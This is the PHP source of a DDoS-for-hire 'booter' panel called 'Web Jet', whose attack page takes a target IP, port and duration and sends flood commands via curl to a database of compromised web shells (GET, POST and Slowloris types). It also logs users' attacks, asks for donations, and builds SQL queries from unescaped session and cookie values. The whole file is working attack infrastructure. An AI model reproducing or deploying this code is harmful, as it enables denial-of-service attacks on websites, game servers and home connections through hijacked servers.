<?php
include "dbc.php";
page_protect();
include "includes/functions.php";
getBooterTitle();
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>

	<title>Attack</title>

	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />

	<meta name="keywords" content="" />	
	<meta name="description" content="" />
	<meta name="robots" content="" /><!-- change into index, follow -->
				
	<link rel="stylesheet" href="stylesheets/style.css" type="text/css" />
	
	<!--[if lte IE 6]>
		<script type="text/javascript" src="javascripts/pngfix.js"></script>
		<script type="text/javascript" src="javascripts/ie6.js"></script>
		<link rel="stylesheet" href="stylesheets/ie6.css" type="text/css" />
	<![endif]-->

</head>

<body>

<!--  / WRAPPER \ -->
<div id="wrapper">
	
    <!--  / MAIN CONTAINER \ -->
    <div id="mainCntr">

		<!--  / HEADER CONTAINER \ -->
		<div id="headerCntr">
		
			<h1><a href="#">Web Jet</a></h1>
			  
			<!-- / MENU CONTAINER \ -->
			<div id="menuCntr">
			
				<ul>
					<li><a href="index.php">Home</a></li>
					<li><a href="hub.php" class="active">DDoS Attack</a></li>
                                        <li><a href="cell.php">Cell</a></li>
					<li><a href="mysettings.php">My Account</a></li>
					<li><a href="pinger.php">Pinger</a></li>
					<li><a href="logout.php">Logout</a></li>
				</ul>
				
			</div>
			<!-- \  MENU CONTAINER  /-->
			
		</div>
		<!--  \ HEADER CONTAINER / -->
			
		  <!--  / HAEDING BOX \ -->
		<div class="headingBox">
			<div class="heading">
			
			<h2>DDoS Attack</h2>
			
			</div>
        </div>
		<!--  \ HAEDING BOX / -->
			  
       
		
        <!--  / CONTENT CONTAINER \ -->
        <div id="contentCntr" class="background">
			<div class="center">
			<!--  / LEFT CONTAINER \ -->
			<div id="leftCntr">
				

                    
                    
					<!--  / OUR BLOG BOX \ -->
					<div class="ourbloginnerBox">
						<div class="top">
							<div class="bottom">
								
                    
                    
                    








<div id="right">
<div class="small-box"><h2>Welcome, <?php echo $username; ?>!</h2>
    <div class="small-box-content">
        <p>
        Profile ID: <font color="#a5a5a5"><?php echo $id; ?></font> <br />
        Rank: <font color="#a5a5a5"><?php echo $level; ?></font> <br />
        My IP: <?php echo $_SERVER['REMOTE_ADDR']; ?><br />
        My Attacks: <font color="#a5a5a5"><?php
    $query = mysql_query("SELECT * FROM `users` WHERE id='$id' ");
    while($row = mysql_fetch_array($query)){
    $attacks = $row['myAttacks'];
    echo $attacks;
    }
?></font>
        </p>

    </div></div>
    
<span style="line-height:1.2em;">
        <div class="small-box"><h2>Members Statistics</h2>
    <div class="small-box-content">
        <p>


                    <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1" class="forms">
                        <font size=1>
          <tr>
            <td><font color="#575757">Total Users</font></td>
            <td><?php echo $all; ?></td></tr></font>
          

          <tr>
            <td><font color="#575757">Active Users</font></td>
            <td><?php echo $active; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">Pending Users</font></td>
            <td><?php echo $total_pending; ?></font></td>
          </tr>
          <tr>
            <td><font color="#575757">Total Attacks</font></td>
            <td><?php
                   $result = mysql_query("SELECT * FROM logs", $link);
                   $num_rows4 = mysql_num_rows($result);
                   echo "$num_rows4";
                ?></font></td>
          </tr>
                    </font>
                    </table>
        </p>


    </div></div>

    <div class="small-box"><h2>Shells Statistics</h2>
    <div class="small-box-content">
        <p>


                    <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1" class="forms">
                        <font size="1">
                                      <tr>
            <td><font color="#575757">Shell Rotation</font></td>
            <?php
            if($shellRotation == 0) { ?>
            <td><font color="red">(Off)</font></td>
            <?php } else { ?>
            <td><font color="#00bc00">(On)</font></td>
            <?php
            }
            ?>
           
          </tr>
          
          <tr>
            <td><font color="#575757">Shells Online</font></td>
            <td><font color="#00bc00"><?php echo $shellsOnline; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">GET Shells</font></td>
            <td><font color="#00bc00"><?php echo $num_rows; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">POST Shells</font></td>
            <td><font color="#00bc00"><?php echo $num_rows2; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">Slowloris Shells</font></td>
            <td><font color="#00bc00"><?php echo $num_rows3; ?></font></td>
          </tr>
                        </font>
                    </table>
        </p>
</span> 

    </div></div>
</div>

                    
                    
                    
                    

					
							</div>
						</div>	 
					</div>
					<!--  / OUR BLOG BOX \ -->
					
					<!--  / OUR BLOG BOX \ -->

									


							<div class="ourbloginnerBox">
						<div class="top">
							<div class="bottom">
			
							<h2>Chat Member</h2>
							<object width="250" height="360" id="obj_1302316498383"><param name="movie" value="http://WiFiChatRoom.chatango.com/group"/><param name="AllowScriptAccess" VALUE="always"/><param name="AllowNetworking" VALUE="all"/><param name="AllowFullScreen" VALUE="true"/><param name="flashvars" value="cid=1302316498383&b=100&c=666666&d=666666&f=46&k=666666&l=000000&m=000000&s=1"/><embed id="emb_1302316498383" src="http://WiFiChatRoom.chatango.com/group" width="250" height="360" allowScriptAccess="always" allowNetworking="all" type="application/x-shockwave-flash" allowFullScreen="true" flashvars="cid=1302316498383&b=100&c=666666&d=666666&f=46&k=666666&l=000000&m=000000&s=1"></embed></object><br>

                            
			
							</div>
						</div>	 
					</div>	


                            	
                    <p>&nbsp;</p>
					<!--  / OUR BLOG BOX \ -->
				
			</div>
			<!--  \ LEFT CONTAINER / -->
			
			<!--  / RIGHT CONTAINER \ -->
			<div id="rightCntr">
				
				<!--  / ABOUT BOX \ -->
				<div class="aboutBox">
				<h3><span>DDoS Attack</span></h3>
				<p class="first"><strong>Donate</strong>: If you feel generous enough to donate to us, to make the booter stronger click the Donate tab ! -Thanks.</p>
                
</div>
					
				<p>
                
                
              
              
              
              

              
<script src="javascript/jquery-1.4.4.min.js" type="text/javascript"></script>
<script type="text/javascript">
function hub()
	{
	if (window.XMLHttpRequest)
	  {
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {
	    document.getElementById("sent").innerHTML = "Request has been sent to all shells.";
	    }
	  }
	xmlhttp.open("GET","hub.php?host="+document.getElementById('host').value+"&time="+document.getElementById('time').value+"&port="+document.getElementById('port'));
	xmlhttp.send();
}
</script>
<div class="box">
    <h2>&nbsp;</h2>
    <h2>Important Notice</h2>
    <p>&nbsp;</p>
    <div class="box-content">
  <p>
            <font color="red"><center><strong>Important Notice</strong></font>: Attacking the same IP Address repeatedly will result in suspension of your account without refund Also If you go crazzy with the booter and hit nonstop I dont Give a fuck you will get banned without refund. You must wait 5 minutes before each Hit or you get banned without refund. Don't think I wont ban you because I will if your overuseing and missuseing the booter!.</center>
        </p>
    </div>

</div>

<div class="box">
    <h2>&nbsp;</h2>
    <h2>&nbsp;</h2>
    <h2>Resolve Host to IP Address</h2>
    <p>&nbsp;</p>
    <div class="box-content">
        <p>
          <?php
function printForm()
{
global $www;

$action = $_SERVER["PHP_SELF"];

print <<<ENDHTM
<form method="post" action="$action">
<p>http:// <input type="text" name="www" id="hello" value="$www"/> <input type="submit" value="Resolve" id="doLogin4" /></p>
</form>

ENDHTM;
}

if($_REQUEST['www'])
{
print $www;

$domain = strtolower($_REQUEST['www']);
$xArray = @parse_url($domain);

	if(!$xArray["scheme"])
	{
	$domain = "http://" . $domain;
	$xArray = @parse_url($domain);
	}

	$xProtocol = $xArray["scheme"];
	$xHost   = $xArray["host"];
	$xPort   = $xArray["port"];
	$xUser   = $xArray["user"];
	$xPass   = $xArray["pass"];
	$xPath   = $xArray["path"];
	$xQuery  = $xArray["query"];
	$xFragment = $xArray["fragment"];

	$domain = $xProtocol ."://". $xHost . $xPath . ($xQuery?"?":"") . $xQuery;
	$www = $xHost . $xPath . ($xQuery?"?":"") . $xQuery;

	printForm();

		if(@gethostbyname($xHost) == $xHost)
		{
		$ip2 = "Returned hostname";
		$hostname2 = "Cancelled";
		}
		else
		{
		$ip2 = @gethostbyname($xHost);
		$hostname2 = @gethostbyaddr($ip2);
		}
	print "<div><p><strong><font color=\"black\">IP Address</font></strong>: $ip2</p></div>\n";
	print "<div><p><strong><font color=\"black\">Hostname</font></strong>: $hostname2</p></div>\n";
}
else
{
		if(isset($_COOKIE['URL']))
		{
		$www = $_COOKIE['URL'];
		}
printForm();
}
?>
        </p>
    </div>
</div>

<div class="box">
<h2>&nbsp;</h2>
<h2>&nbsp;</h2>
<h2>UDP Flood</h2>
<p>&nbsp;</p>
<div class="box-content">
<p>
<form>
        <table width="50%" border="0" align="center" cellpadding="3" cellspacing="3" class="forms">
<link rel="stylesheet" href="style1.css" type="text/css">

          <tr>
            <td><p>IP/DNS</p>
            <p>&nbsp;</p></td>
            <td><p>
              <input type="text" id="hello" onkeypress="handleKeyPress(event,this.form)" name="host" value=""/>
            </p>
            <p>&nbsp; </p></td>
          </tr>

          <tr>
            <td><p>Seconds</p>
            <p>&nbsp;</p></td>
            <td><p>
              <input type="text" id="boby1" onkeypress="handleKeyPress(event,this.form)" name="time" value="30"/>
            </p>
            <p>&nbsp; </p></td>
          </tr>

          <tr>
            <td><p>Port</p>
            <p>&nbsp;</p></td>
            <td><p>
        
        
<script type="text/javascript">
function changeText(input)
{
     document.getElementById("boby").value = input.value;
}
</script>        
            
<input type="text" id="boby" onkeypress="handleKeyPress(event,this.form)" name="port" value="" > <br />
<input type="radio" name="sex" value="3074" onclick="changeText(this)" /> Xbox Live
<input type="radio" name="sex" value="80" onclick="changeText(this)" /> Website, Home Connection
<input type="radio" name="sex" value="21" onclick="changeText(this)" /> FTP
<input type="radio" name="sex" value="27015" onclick="changeText(this)" /> CSS Server
<input type="radio" name="sex" value="6667" onclick="changeText(this)" /> IRC


              
            </p>
            <p>&nbsp; </p></td>
          </tr>

          <tr>
            <td></td>
            <td><input type="submit" value="Initiate Attack" onclick="hub();" id="doLogin3" /></td>
          </tr>

      </table>
<form>
  </p>
<form>
</form>
		 <form action="hub.php" method="post">
		  &nbsp;
		  </p>
                 </form>
<p id="sent"></p>
<script type="text/javascript">
function handleKeyPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		hub();
	}
}
function handleEnterPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		getip();
	}
}
</script>
<?php
set_time_limit(0);
ignore_user_abort(TRUE);

include 'includes/EpiCurl.php';
require("includes/ezSQLCore.php");
require("includes/ezSQL.php");

$query = mysql_query("SELECT * FROM `users` WHERE `id`='$_SESSION[user_id]' AND `banned`=1") or die(mysql_error());
if (mysql_num_rows($query) > 0) {
	mysql_query("update `users`
		set `ckey`= '', `ctime`= ''
		where `id`='$_SESSION[user_id]' OR  `id` = '$_COOKIE[user_id]'") or die(mysql_error());
	unset($_SESSION['user_id']);
	unset($_SESSION['user_name']);
	unset($_SESSION['user_level']);
	unset($_SESSION['HTTP_USER_AGENT']);
	session_unset();
	session_destroy();
	setcookie("user_id", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_name", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_key", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	die("You do not have permission to view this page.");
}

if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS);
	$SQL->select(DB_NAME);
	$Query = "SELECT * FROM `getshells`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


if($time >= 181) {
die("<hr>You cannot issue attacks exceeding 180 seconds.");
}

if($host == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($time == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($port == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

/*
* Example Blacklisting
*/

if($host == "hackforums.net") { die("<hr>You cannot attack this."); }
if($host == "69.162.82.250") { die("<hr>You cannot attack this."); }
if($host == "69.162.82.251") { die("<hr>You cannot attack this."); }
if($host == "199.27.135.76") { die("<hr>You cannot attack this."); }
if($host == "69.162.82.252") { die("<hr>You cannot attack this."); }


/*
* End of blacklisting
*/

    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&host={$host}&time={$time}&port={$port}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }

	$Query = "SELECT * FROM `postshells`";
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}";

    for($i = 0; $i < $AffectedRows; $i++)
    {
		$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
        if (strlen($shell) == 0)
            continue;
        $header = array();
		$header[] = "Cache-Control: max-age=0";
		$header[] = "Connection: keep-alive";
		$header[] = "Keep-Alive: 300";
		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
		$header[] = "Accept-Language: en-us,en;q=0.5";
		$header[] = "Pragma: ";
        $ch2[$i] = curl_init($shell);
		curl_setopt($ch2[$i], CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch2[$i], CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2[$i], CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch2[$i], CURLOPT_POST, 1);
        curl_setopt($ch2[$i], CURLOPT_POSTFIELDS, $post);
        $curl1 = $mc->addCurl($ch2[$i]);
    }

echo "<p id='sent'><center><strong><font color=\"#00e300\">Attack has been sent!</font></strong></center></p>";

$username = $_SESSION['user_name'];
$host = strip_tags(mysql_real_escape_string($_GET['host']));
$time = strip_tags(mysql_real_escape_string($_GET['time']));
$port = strip_tags(mysql_real_escape_string($_GET['port']));
$date = date("m-d-Y, h:i:s a", time());

mysql_query("INSERT INTO logs
(username, ip, time, port, date) VALUES('" . $username . "', '" .$host . "', '" . $time . "', '" . $port . "', '" . $date . "' ) ")
or die(mysql_error());

mysql_query("UPDATE users set myAttacks = myAttacks + 1 WHERE full_name = '" . $username . "'") or die(mysql_error());

}
?>

</div>
</div>
</body>
</html>

<br>
              
         <p>&nbsp;</p>
         
         <?php
include 'footer.php';
?>
              
              
  
                
                
                </p>
				</div>
              
				<!--  / ABOUT BOX \ -->
				
				
			</div>
			<!--  \ RIGHT CONTAINER / -->  
			
        </div>
		</div>
        <!--  \ CONTENT CONTAINER / -->
		
	</div>
	<!--  \ MAIN CONTAINER / -->
	
	<!--  / FOOTER CONTAINER \ -->
	
	
	
	
	
	
	
	         <?php
include 'footer1.php';
?>
	
	<p>&nbsp;</p>
	
	
	
	
	
	
	<!--  \ FOOTER CONTAINER / -->
		
</div>
<!--  \ WRAPPER / -->

</body>

</html>